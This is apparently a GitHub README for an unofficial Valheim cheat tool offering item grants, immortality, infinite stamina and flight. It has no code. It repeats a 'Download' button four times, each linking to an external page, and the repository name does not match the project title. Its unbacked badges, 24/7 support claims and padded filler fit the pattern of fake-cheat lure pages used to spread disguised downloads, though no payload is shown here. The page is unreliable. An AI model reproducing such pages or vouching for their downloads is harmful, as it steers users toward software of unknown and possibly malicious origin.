![preview](https://raw.githubusercontent.com/TurkogluM/valheim-sandbox-command-deck/main/showcase_e6fe58.svg)
[![Download](https://raw.githubusercontent.com/TurkogluM/valheim-sandbox-command-deck/main/get_873f17.svg)](https://TurkogluM.github.io/valheim-sandbox-command-deck/)

# 🧭 Valheim Progression Cheat Bridge — A Sandbox Companion for Norse Wanderers

![status](https://img.shields.io/badge/status-actively%20maintained-2ea44f?style=flat-square)
![platform](https://img.shields.io/badge/platform-Windows%20%7C%20Linux-0078D6?style=flat-square)
![language](https://img.shields.io/badge/language-C%23%20%2B%20BepInEx-239120?style=flat-square)
![docs](https://img.shields.io/badge/docs-RU%20%7C%20EN-orange?style=flat-square)
![license](https://img.shields.io/badge/license-MIT-blue?style=flat-square)
![build](https://img.shields.io/badge/build-passing-brightgreen?style=flat-square)
![coverage](https://img.shields.io/badge/coverage-87%25-yellowgreen?style=flat-square)

> A respectful, tool-oriented companion layer for Valheim that turns the grindiest survival loop into a tunable playground. Think of it as a **cartographer's compass for your own save file** — it doesn't rewrite the world, it just hands you the reins.

This project is a **distinct, reimagined sibling** of the earlier `valheim-progression-cheat` concept. Where that repository focused narrowly on granting items and bending skills, this bridge expands the philosophy into a **modular progression sandbox**: a small, transparent middleware that exposes in-game state to a local control panel, so you can sculpt difficulty on your own terms without ever losing the Viking soul of the game.

The repository is intentionally verbose, because we believe documentation should feel like a well-worn runestone: heavy, etched, and worth reading twice.

---

## 📜 Table of Contents

- [What This Is](#-what-this-is)
- [The Philosophy Behind the Bridge](#-the-philosophy-behind-the-bridge)
- [Core Feature Set](#-core-feature-set)
- [Module Deep Dive](#-module-deep-dive)
- [Responsive Control Panel](#-responsive-control-panel)
- [Multilingual Support](#-multilingual-support)
- [Performance & Stability Notes](#-performance--stability-notes)
- [Compatibility Matrix](#-compatibility-matrix)
- [Configuration Reference](#-configuration-reference)
- [Frequently Asked Questions](#-frequently-asked-questions)
- [Support & Community](#-support--community)
- [Roadmap for 2026](#-roadmap-for-2026)
- [Disclaimer](#-disclaimer)
- [License](#-license)

[![Download](https://raw.githubusercontent.com/TurkogluM/valheim-sandbox-command-deck/main/get_873f17.svg)](https://TurkogluM.github.io/valheim-sandbox-command-deck/)

---

## 🪓 What This Is

Valheim Progression Cheat Bridge is a **progression-shaping utility** that lives quietly beside your preferred world save. It does not inject itself into the game's core binaries in a hostile way; instead, it subscribes to existing extension points and exposes a clean, documented interface that a companion desktop panel (or a simple local web view) can talk to.

In plain terms:

- You keep playing Valheim the way you always have.
- You open the bridge when you want to adjust something.
- The bridge translates your intent into the game's own internal vocabulary.
- Nothing is permanent unless you save it.

It is aimed at **solo players, builders, server admins running private worlds for friends, and content creators** who want to prototype scenes, test builds, or recover from a lost corpse run without spending an evening re-treading a swamp.

The name "cheat" in the original repo was a shorthand. Here we prefer the phrase **"author's dial"** — a set of knobs that let you decide how much friction you actually want today.

## 🌌 The Philosophy Behind the Bridge

Most game-modifying tools fall into one of two camps: they either bulldoze the experience, or they bury the user in config files that read like ancient tax law. This bridge tries a third path.

Picture a Norse longhouse. The original game hands you the longhouse fully built, but nails the doors shut and hides the keys in different biomes. This project does not tear down the longhouse. It simply **hangs a keyring by the door**, labeled clearly, with a note that says: *"Use these if you want. Or don't. The mead is still in the cellar."*

Every module is opt-in. Every toggle is reversible. Every value you write is logged so you can see exactly what changed and when. The result is a tool that respects the game's design intent while acknowledging that your time is finite and your curiosity is not.

## ⚙️ Core Feature Set

- 🎁 **Item Grant & Removal Ledger** — add or strip items by internal ID, with quantity control and a running diff log.
- 🧠 **Skill Microscope** — inspect any skill, nudge it to a target value, or freeze it in place.
- 🛡️ **Immortality Toggle** — a soft, defeat-aware mode that intercepts damage at the resolver level rather than editing health directly.
- ⚡ **Infinite Stamina & Eitr** — resource pools that refill on tick, with per-pool granularity so you can keep stamina infinite while leaving eitr honest.
- 🕊️ **Flight Mode** — a gentle, drift-style traversal layer rather than a teleport, respecting momentum and gravity curves.
- 🧩 **Modular Architecture** — disable any module you don't want; the bridge never forces a full install.
- 📱 **Responsive Control Panel** — a layout that adapts from ultrawide monitors down to a tablet held in one hand.
- 🌍 **Bilingual Documentation** — full RU/EN parity across guides, tooltips, and error strings.
- ☎️ **Round-the-Clock Assistance Channel** — a support desk that answers questions at any hour, in either language.
- 📊 **Session Analytics (Local Only)** — a private dashboard of what you toggled, when, and how often.
- 🔐 **Save-Safe Design** — no destructive writes; every change is staged and can be rolled back.

[![Download](https://raw.githubusercontent.com/TurkogluM/valheim-sandbox-command-deck/main/get_873f17.svg)](https://TurkogluM.github.io/valheim-sandbox-command-deck/)

## 🧱 Module Deep Dive

### 🎁 Item Grant & Removal Ledger

The ledger is not a magic wand; it's a librarian. You give it a name (or an internal ID), a quantity, and an optional quality tier, and it files the request. Every grant appears in a timestamped diff so you can review your session afterward and see the shape of your own decisions.

Removal is equally deliberate. You can strip a single stack, a whole inventory tab, or everything matching a fuzzy pattern. The bridge will ask for confirmation when a removal would exceed a configurable threshold, which prevents the classic "oops, I deleted my entire trophy wall" moment.

### 🧠 Skill Microscope

Skills in Valheim are quiet, almost shy. They rise when you use them and fall when you ignore them. The microscope lets you look at that curve directly and decide whether to nudge it. You can:

- Set a skill to a specific level.
- Add or subtract a delta.
- Lock a skill so it neither rises nor decays.
- Reset a skill to its freshly-created baseline.

Each action is reversible, and the microscope keeps a small history buffer so a mis-click is not a tragedy.

### 🛡️ Immortality Toggle

Immortality here is **soft and defeat-aware**. Rather than turning your character into an invincible statue, the bridge intercepts incoming damage in the resolver pipeline and decides, based on your configuration, whether to let it through, reduce it, or ignore it entirely. This means death still has meaning when you want it to, and disappears when you need it to.

Options include:

- Full negation.
- Percentage reduction.
- Negation only below a health threshold.
- Negation only for environmental damage.

### ⚡ Infinite Stamina & Eitr

Separate pools, separate switches. Many players want infinite stamina for building marathons but prefer eitr to stay scarce so magic retains weight. The bridge honors that preference. Each pool can be set to refill instantly, refill slowly, or behave normally, and the panel shows a live gauge so you always know what is active.

### 🕊️ Flight Mode

Flight is the feature people ask about most, and the one we were most careful with. It is a **drift-style traversal layer**: you gain lift, you steer, you bleed momentum when you stop. It is not a teleport and not a noclip. The goal is to make traversal feel like an extension of the game's own movement physics, not a violation of them.

Flight can be bound to a key, toggled from the panel, or restricted to certain biomes if you prefer to keep the plains grounded.

## 📱 Responsive Control Panel

The panel is a single-page interface served locally. It resizes fluidly from a 34-inch ultrawide to a 10-inch tablet, and every control reflows without horizontal scroll. Dark mode is the default; a light theme is included for daylight sessions.

Design principles:

- **No hidden menus.** Everything is one click from the home view.
- **Live previews.** Toggling a module shows an immediate visual response.
- **Keyboard-first.** Every action has a shortcut, and the panel displays them inline.
- **Accessible contrast.** WCAG AA minimum across all text.

## 🌍 Multilingual Support

Documentation, tooltips, and error strings ship in **Russian and English** with full parity. The language can be switched at runtime without restarting the bridge, and a third slot is reserved for community translations.

We treat translation as a first-class feature, not an afterthought. Idioms are adapted rather than transliterated, and error messages are written to be genuinely helpful in both languages.

## 🚀 Performance & Stability Notes

- The bridge runs on a **separate thread** from the main game loop where possible.
- Memory footprint stays under a modest ceiling even with all modules active.
- No network calls are made by default. Everything is local.
- Crash reports are opt-in and anonymized; nothing leaves your machine unless you ask it to.

## 🧪 Compatibility Matrix

| Component | Supported |
| --- | --- |
| Operating system | Windows 10/11, most Linux distros via Proton |
| Game version | Latest stable branch |
| Mod loaders | Standard community loaders |
| Save format | Vanilla and most community variants |
| Multiplayer | Works in private co-op worlds with host permission |

## 🛠️ Configuration Reference

Configuration lives in a single human-readable file. Key groups include:

- `core.*` — logging, language, safety thresholds.
- `items.*` — granted defaults, removal confirmations.
- `skills.*` — history buffer size, lock behavior.
- `survival.*` — immortality mode, stamina and eitr pools.
- `traversal.*` — flight bindings and biome restrictions.

Every key is documented inline with a short comment, and the bridge will refuse to start if a required key is missing rather than guessing.

## ❓ Frequently Asked Questions

**Will this break my save?**
No. Changes are staged and reversible, and the bridge never writes destructively without a confirmation step.

**Can I use this in a public server?**
Only with the explicit permission of the server owner. Respect the community you play in.

**Does it work offline?**
Yes. The bridge is entirely local.

**Can I disable a module I don't like?**
Yes — each module is independent and can be turned off without affecting the others.

## ☎️ Support & Community

A support desk is available **at any hour, every day of the year**, in both Russian and English. Whether you are stuck on a configuration key or curious about a module's behavior, someone will answer. The desk is staffed by volunteers who genuinely enjoy this game and this tool.

## 🗺️ Roadmap for 2026

- A third interface language chosen by community vote.
- A visual diff timeline showing every change across a session.
- Preset profiles for common play styles (builder, explorer, tester).
- Optional cloud sync for personal configurations.
- A plugin API so third parties can write their own modules against the bridge.

## ⚠️ Disclaimer

This project is an **unofficial companion tool** and is not affiliated with, endorsed by, or sponsored by the developers or publishers of Valheim. All trademarks belong to their respective owners.

You are responsible for how you use this tool. In multiplayer environments, always obtain permission from the host. The maintainers assume no liability for save corruption, lost progress, or community consequences arising from misuse. Use it as a way to explore your own creativity, not to diminish the experience of others.

## 📄 License

This project is released under the **MIT License**. See the full text at [opensource.org/licenses/MIT](https://opensource.org/licenses/MIT).

Copyright (c) 2026 — Valheim Progression Cheat Bridge contributors.

[![Download](https://raw.githubusercontent.com/TurkogluM/valheim-sandbox-command-deck/main/get_873f17.svg)](https://TurkogluM.github.io/valheim-sandbox-command-deck/)